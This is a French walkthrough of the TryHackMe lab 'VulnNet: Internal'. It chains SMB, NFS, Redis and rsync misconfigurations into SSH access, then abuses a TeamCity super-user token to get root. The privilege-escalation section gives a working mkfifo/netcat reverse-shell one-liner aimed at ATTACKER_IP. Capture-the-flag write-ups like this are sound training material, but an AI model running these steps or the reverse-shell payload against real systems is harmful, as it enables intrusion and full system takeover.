**VulnNet: Internal — Walkthrough TryHackMe**  
**Room :** VulnNet: Internal  
**Lien :** https://tryhackme.com/room/vulnnetinternal  
**Difficulté :** Facile  
**Description :**  
VulnNet Entertainment learns from its mistakes, and now they have something new for you...  

# Objectifs pédagogiques
Cette room permet de travailler plusieurs notions clés en pentest :
- Énumération de services réseau
- Exploitation de services mal configurés (SMB, NFS, Redis, rsync)
- Pivot interne
- Accès persistant via clés SSH
- Escalade de privilèges via un service interne (TeamCity)

⚠️ Ce walkthrough est fourni à des fins éducatives uniquement.  
N’effectuez jamais ces techniques sur des systèmes sans autorisation explicite.  

# 1. Reconnaissance (Recon)
Après avoir lancé la machine cible et connecté notre VM au réseau TryHackMe via OpenVPN, nous commençons par une phase de reconnaissance avec Nmap.  
### Objectif  
Identifier la surface d’attaque :
- ports ouverts
- services exposés
- système d’exploitation

### Scan réseau : 
```bash
nmap -sC -sV -A -p- -T4 IP_CIBLE
```

### Explication des options
- sC : exécute les scripts Nmap par défaut (énumération basique, bannières, configurations)
- sV : détection des versions des services
- A : mode agressif (OS detection, traceroute, scripts avancés)
- -p- : scan de tous les ports (1–65535)
- T4 : accélère le scan
- IP_CIBLE : adresse IP de la machine cible

### Analyse des services exposés
Ports ouverts principaux :
| Port    | Service   | Intérêt |
|---------|-----------|---------|
| 22      | SSH       | Accès distant (post-exploitation) |
| 111     | rpcbind   | Indique souvent la présence de NFS |
| 139 / 445 | SMB     | Énumération de partages |
| 873     | rsync     | Modules parfois publics |
| 2049    | NFS       | Exports accessibles |
| 6379    | Redis     | Souvent exposé sans authentification |
| 41643   | Java RMI  | Potentiel RCE |  

### Système d’exploitation
- Linux kernel 4.15
- Probablement Ubuntu 18.04
- Cohérent avec OpenSSH 8.2p1

### Services les plus prometteurs
Nous priorisons :
- SMB
- NFS
- Redis
- rsync

Ces services sont fréquemment mal configurés dans les CTF et environnements réels.  

# 2. Énumération

## 1. Énumération SMB  
La présence des ports 139 et 445 indique un service Samba (SMB).  

Nous testons l’accès sans authentification (NULL session) :
```bash
smbclient -L //IP_CIBLE/ -N
```

Résultat : un partage nommé shares, accessible en lecture seule.

Connexion au partage :
```bash
smbclient //IP_CIBLE/shares -N
```

### Contenu du partage
Deux dossiers :
- temp
- data

Dans temp, nous trouvons un fichier services.txt, que nous téléchargeons :
```bash
get services.txt
```

➡️ Ce fichier contient le premier flag.

Les fichiers présents dans data (data.txt, business-req.txt) ne contiennent aucune information exploitable.

## 2. Énumération Redis
Le port 6379 correspond à Redis.

Connexion initiale :
```bash
redis-cli -h IP_CIBLE
```

La connexion est possible, mais aucune commande n’est autorisée, ce qui indique qu’une authentification est requise.  
Avant toute attaque bruteforce, nous poursuivons l’énumération des autres services afin de trouver des identifiants en clair.  

## 3. Énumération NFS
La présence de rpcbind (111) et NFS (2049) indique des exports NFS.

Liste des exports :
```
showmount -e IP_CIBLE
```

Un répertoire est exporté et accessible.

### Montage du partage NFS
```bash
mkdir nfs_mount
sudo mount -t nfs IP_CIBLE:/chemin_export nfs_mount
```

Exploration du contenu :
```
tree
```

Un fichier attire immédiatement l’attention : *redis.conf*

### Pourquoi c’est important ?
Les fichiers de configuration contiennent souvent :
- des mots de passe
- des chemins sensibles
- des options de sécurité

Dans redis.conf, nous trouvons la directive :
```conf
requirepass MOT_DE_PASSE
```

# 3. Exploitation

## 1. Exploitation Redis
Connexion avec le mot de passe récupéré :
```bash
redis-cli -h IP_CIBLE -a MOT_DE_PASSE
```

Cette fois, les commandes fonctionnent.

Liste des clés :
```bash
keys *
```

La clé *internal flag* contient le deuxième flag.

D’autres clés intéressantes :
- authlist
- marketlist

Leur type est *list* :
```bash
type authlist
lrange authlist 0 -1
```

### Décodage Base64
Les valeurs récupérées sont encodées en Base64. Une fois décodées, elles révèlent des logs d’authentification rsync, incluant un mot de passe.

## 2. Exploitation Rsync
Identifiants récupérés :
```
Utilisateur : rsync-connect
Mot de passe : ********
```

Liste des modules :
```bash
rsync rsync://rsync-connect@IP_CIBLE/
```

Un module **files** est accessible.

Téléchargement du contenu :
```bash
rsync -av rsync://rsync-connect@IP_CIBLE/files ./rsync_dump
```

Dans ce répertoire, nous trouvons user.txt → flag utilisateur.

Le module rsync permet l’écriture dans le home sys-internal.

Génération de clés SSH
```bash
ssh-keygen
```

Upload de la clé publique :
```
rsync -av ~/.ssh/id_rsa.pub rsync://rsync-connect@IP_CIBLE/home/sys-internal/.ssh/authorized_keys
```

Connexion SSH :
```bash
ssh -i ~/.ssh/id_rsa sys-internal@IP_CIBLE
```

➡️ Accès utilisateur obtenu.

# 4. Post-exploitation et pivot interne
Énumération des ports locaux :
```bash
ss -tulpn
```

Un service écoute sur le port 8111, accessible uniquement en local.

Ce port est fréquemment utilisé par TeamCity, un serveur CI/CD.

## 🔁 Port forwarding
```bash
ssh -i ~/.ssh/id_rsa -L 8111:127.0.0.1:8111 sys-internal@IP_CIBLE
```

Accès via navigateur :
```
http://localhost:8111
```

Version détectée :
- TeamCity 2020.2.2

## 🔓 Contournement de l’authentification TeamCity  
TeamCity permet une connexion super-admin via un token stocké dans les logs.

Recherche du token :
```bash
find / -name "*teamcity*" 2>/dev/null
```

Dans catalina.out, nous trouvons le super user authentication token.  

Connexion :
- Username : vide
- Password : token

# 5. Privelege Escalation (Privesc)
Pourquoi ça fonctionne ?  
TeamCity exécute les build steps avec les privilèges du service, ici root.

Création d’un projet → configuration → Command Line build step.

Payload reverse shell :
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 1234 > /tmp/f
```

Sur la machine attaquante :
```bash
nc -lvnp 1234
```

Exécution du build → shell root reçu 🎉

🏁 Flag final
cat /root/root.txt
